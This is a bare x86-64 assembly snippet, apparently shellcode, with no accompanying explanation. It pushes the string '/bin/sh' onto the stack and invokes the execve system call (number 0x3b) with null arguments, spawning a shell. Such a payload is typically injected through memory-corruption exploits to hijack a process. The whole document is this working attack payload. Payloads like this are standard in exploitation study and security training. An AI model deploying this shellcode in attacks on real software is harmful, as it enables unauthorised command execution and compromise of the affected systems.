mov rax, 0x68732f6e69622f
push rax
mov rdi,rsp
mov rax, 0x3b
xor rsi,rsi
xor rdx,rdx
syscall
